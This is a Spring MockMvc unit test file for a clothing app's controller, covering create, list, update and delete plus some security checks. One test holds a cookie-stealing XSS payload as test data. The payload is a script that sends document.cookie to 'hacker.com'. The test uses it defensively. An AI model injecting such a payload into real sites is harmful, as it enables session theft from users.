package com.ootd.fitme.domain.clothes.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.ootd.fitme.domain.catalog.service.CatalogClothesService;
import com.ootd.fitme.domain.clothes.dto.ClothesDto;
import com.ootd.fitme.domain.clothes.dto.request.ClothesCreateRequest;
import com.ootd.fitme.domain.clothes.dto.request.ClothesDtoCursorRequest;
import com.ootd.fitme.domain.clothes.dto.request.ClothesUpdateRequest;
import com.ootd.fitme.domain.clothes.dto.response.ClothesDtoCursorResponse;
import com.ootd.fitme.domain.clothes.enums.ClothesType;
import com.ootd.fitme.domain.clothes.enums.SortBy;
import com.ootd.fitme.domain.clothes.enums.SortDirection;
import com.ootd.fitme.domain.clothes.exception.ClothesException;
import com.ootd.fitme.domain.clothes.service.ClothesService;
import com.ootd.fitme.global.exception.ErrorCode;
import com.ootd.fitme.global.security.auth.CustomUserPrincipal;
import com.ootd.fitme.global.security.auth.CustomUserDetailsService;
import com.ootd.fitme.global.security.jwt.JwtProvider;

import com.ootd.fitme.global.security.jwt.TokenBlacklistService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.security.authentication.TestingAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.test.web.servlet.MockMvc;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.UUID;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.BDDMockito.given;
import static org.mockito.BDDMockito.then;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.mock;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.authentication;
import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.csrf;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@WebMvcTest(ClothesController.class)
@DisplayName("ClothesController 단위 테스트")
class ClothesControllerTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @MockitoBean
    private ClothesService clothesService;

    @MockitoBean
    private CatalogClothesService catalogClothesService;

    @MockitoBean
    private JwtProvider jwtProvider;

    @MockitoBean
    private CustomUserDetailsService customUserDetailsService;

    @MockitoBean
    private TokenBlacklistService tokenBlacklistService;

    private UUID loginUserId;
    private Authentication customPrincipalAuthentication;

    @BeforeEach
    void setUp() {
        loginUserId = UUID.randomUUID();
        CustomUserPrincipal principal = mock(CustomUserPrincipal.class);
        given(principal.getUserId()).willReturn(loginUserId);
        customPrincipalAuthentication = new TestingAuthenticationToken(principal, null, "ROLE_USER");
    }

    @Nested
    @DisplayName("옷 생성 (POST) API 테스트")
    class CreateClothesTest {

        @Test
        @DisplayName("[성공] 본인의 ID로 옷 생성을 요청하면 서비스 호출 후 201 Created를 반환한다.")
        void createClothes_Success() throws Exception {
            // given
            ClothesCreateRequest requestDto = new ClothesCreateRequest(
                    loginUserId, "흰 셔츠", ClothesType.TOP, List.of()
            );

            MockMultipartFile requestPart = new MockMultipartFile(
                    "request", "", MediaType.APPLICATION_JSON_VALUE,
                    objectMapper.writeValueAsBytes(requestDto)
            );

            MockMultipartFile imagePart = new MockMultipartFile(
                    "image", "test.png", MediaType.IMAGE_PNG_VALUE, "dummy image content".getBytes()
            );

            ClothesDto mockResponse = new ClothesDto(
                    UUID.randomUUID(), loginUserId, "흰 셔츠", null, ClothesType.TOP, List.of()
            );

            given(clothesService.createClothes(any(ClothesCreateRequest.class), eq(imagePart), eq(loginUserId))).willReturn(mockResponse);

            // when & then
            mockMvc.perform(multipart("/api/clothes")
                            .file(requestPart)
                            .file(imagePart)
                            .with(authentication(customPrincipalAuthentication))
                            .with(csrf())
                    )
                    .andDo(print())
                    .andExpect(status().isCreated())
                    .andExpect(jsonPath("$.name").value("흰 셔츠"));

            then(clothesService).should(times(1)).createClothes(any(), any(), eq(loginUserId));
        }

        @Test
        @DisplayName("[실패] 본인이 아닌 타인의 ID로 옷 생성을 요청하면 403 Forbidden 예외를 던진다.")
        void createClothes_Fail_Forbidden() throws Exception {
            // given: 공격자가 타인의 ID를 ownerId에 몰래 집어넣음
            UUID maliciousTargetId = UUID.randomUUID();
            ClothesCreateRequest requestDto = new ClothesCreateRequest(
                    maliciousTargetId, "해킹된 셔츠", ClothesType.TOP, List.of()
            );

            MockMultipartFile requestPart = new MockMultipartFile(
                    "request", "", MediaType.APPLICATION_JSON_VALUE,
                    objectMapper.writeValueAsBytes(requestDto)
            );
            given(clothesService.createClothes(any(ClothesCreateRequest.class), any(), eq(loginUserId)))
                    .willThrow(new ClothesException(ErrorCode.AUTH_FORBIDDEN));

            // when & then
            mockMvc.perform(multipart("/api/clothes")
                            .file(requestPart)
                            .with(authentication(customPrincipalAuthentication))
                            .with(csrf())
                    )
                    .andDo(print())
                    .andExpect(result -> org.assertj.core.api.Assertions.assertThat(result.getResolvedException()).isInstanceOf(ClothesException.class))
                    .andExpect(result -> {
                        ClothesException ex = (ClothesException) result.getResolvedException();
                        org.assertj.core.api.Assertions.assertThat(ex.getErrorCode()).isEqualTo(ErrorCode.AUTH_FORBIDDEN);
                    });

            then(clothesService).should(times(1)).createClothes(any(), any(), eq(loginUserId));
        }
    }

    @Nested
    @DisplayName("옷 목록 조회 (GET) API 테스트")
    class GetClothesTest {

        @Test
        @DisplayName("[성공] 올바른 요청 시 컨트롤러가 loginUserId 파라미터를 추가하여 서비스를 호출한다.")
        void getClothesList_Success() throws Exception {
            // given
            ClothesDtoCursorResponse mockResponse = new ClothesDtoCursorResponse(
                    List.of(), null, null, false, 0L, SortBy.createdAt, SortDirection.DESCENDING
            );

            given(clothesService.getClothesList(any(ClothesDtoCursorRequest.class), eq(loginUserId)))
                    .willReturn(mockResponse);

            // when & then
            mockMvc.perform(get("/api/clothes")
                            .param("limit", "20")
                            .with(authentication(customPrincipalAuthentication))
                    )
                    .andDo(print())
                    .andExpect(status().isOk());

            then(clothesService).should(times(1)).getClothesList(any(), eq(loginUserId));
        }
    }

    @Nested
    @DisplayName("옷 수정 (PATCH) API 테스트")
    class UpdateClothesTest {

        @Test
        @DisplayName("[성공] Multipart 폼 데이터와 함께 옷 ID, 로그인 유저 ID를 서비스로 잘 넘겨준다.")
        void updateClothes_Success() throws Exception {
            // given
            UUID clothesId = UUID.randomUUID();
            ClothesDto mockResponse = new ClothesDto(
                    clothesId, loginUserId, "수정된 자켓", null, ClothesType.OUTER, List.of()
            );

            given(clothesService.updateClothes(eq(clothesId), eq(loginUserId), any(), any()))
                    .willReturn(mockResponse);

            String requestJson = "{\"name\": \"수정된 자켓\", \"type\": \"OUTER\", \"attributes\": []}";
            MockMultipartFile requestPart = new MockMultipartFile(
                    "request",
                    "",
                    MediaType.APPLICATION_JSON_VALUE,
                    requestJson.getBytes(StandardCharsets.UTF_8)
            );

            MockMultipartFile imagePart = new MockMultipartFile("image", "test.jpg", "image/jpeg", "dummy image content".getBytes());

            // when & then
            mockMvc.perform(multipart("/api/clothes/{clothesId}", clothesId)
                            .file(requestPart)
                             .file(imagePart)
                            .with(request -> {
                                request.setMethod(HttpMethod.PATCH.name());
                                return request;
                            })
                            .with(authentication(customPrincipalAuthentication))
                            .with(csrf())
                    )
                    .andDo(print())
                    .andExpect(status().isOk())
                    .andExpect(jsonPath("$.name").value("수정된 자켓"));

            then(clothesService).should(times(1)).updateClothes(eq(clothesId), eq(loginUserId), any(), any());
        }
    }

    @Nested
    @DisplayName("옷 삭제 (DELETE) API 테스트")
    class DeleteClothesTest {

        @Test
        @DisplayName("[성공] 옷 ID와 로그인 유저 ID를 서비스로 넘기며 204 No Content를 반환한다.")
        void deleteClothes_Success() throws Exception {
            // given
            UUID clothesId = UUID.randomUUID();

            // when & then
            mockMvc.perform(delete("/api/clothes/{clothesId}", clothesId)
                            .with(authentication(customPrincipalAuthentication))
                            .with(csrf())
                    )
                    .andDo(print())
                    .andExpect(status().isNoContent());

            then(clothesService).should(times(1)).deleteClothes(eq(clothesId), eq(loginUserId));
        }
    }
    @Nested
    @DisplayName("보안 및 권한 (Security) 컨트롤러 테스트")
    class ControllerSecurityTest {
        private UUID loginUserId;
        private Authentication mockAuthentication;

        @BeforeEach
        void setUpSecurity() {
            loginUserId = UUID.randomUUID();

            CustomUserPrincipal mockPrincipal = mock(CustomUserPrincipal.class);
            given(mockPrincipal.getUserId()).willReturn(loginUserId);

            mockAuthentication = new TestingAuthenticationToken(mockPrincipal, null, "ROLE_USER");
        }

        @Test
        @DisplayName("[보안/실패] 인증 토큰(Security Context) 없이 API에 접근하면 접근이 차단된다 (401/403)")
        void access_Without_Token_Blocked() throws Exception {
            // given: 인증 객체(mockAuthentication)를 주입하지 않은 순수 무방비 요청

            // when & then
            mockMvc.perform(get("/api/clothes")
                                    .param("limit", "20")
                    )
                    .andDo(print())
                    .andExpect(status().is4xxClientError());

            then(clothesService).shouldHaveNoInteractions();
        }

        @Test
        @DisplayName("[보안/성공] 컨트롤러는 파라미터로 넘어온 악성 XSS 스크립트를 조작 없이 서비스 계층으로 안전하게 넘긴다.")
        void pass_Xss_Payload_To_Service_Safely() throws Exception {
            // given: 해커가 옷 이름에 악성 스크립트를 삽입함
            String maliciousXssPayload = "<script>location.href='http://hacker.com?cookie='+document.cookie;</script> 후드티";
            UUID clothesId = UUID.randomUUID();

            given(clothesService.updateClothes(eq(clothesId), eq(loginUserId), any(ClothesUpdateRequest.class), any()))
                    .willReturn(new ClothesDto(clothesId, loginUserId, "안전한이름", null, ClothesType.TOP, List.of()));

            String requestJson = String.format("{\"name\": \"%s\", \"type\": \"TOP\", \"attributes\": []}", maliciousXssPayload);

            MockMultipartFile requestPart = new MockMultipartFile(
                    "request",
                    "",
                    MediaType.APPLICATION_JSON_VALUE,
                    requestJson.getBytes(StandardCharsets.UTF_8)
            );

            // when & then
            mockMvc.perform(multipart("/api/clothes/{clothesId}", clothesId)
                            .file(requestPart)
                            .param("name", maliciousXssPayload) // XSS 페이로드 전송
                            .with(request -> {
                                request.setMethod(HttpMethod.PATCH.name());
                                return request;
                            })
                            .with(authentication(mockAuthentication))
                            .with(csrf())
                    )
                    .andDo(print())
                    .andExpect(status().isOk());

            then(clothesService).should(times(1)).updateClothes(
                    eq(clothesId),
                    eq(loginUserId),
                    org.mockito.ArgumentMatchers.argThat(req -> req.name().equals(maliciousXssPayload)), // 페이로드 원본 전달 확인
                    any()
            );
        }
    }

}
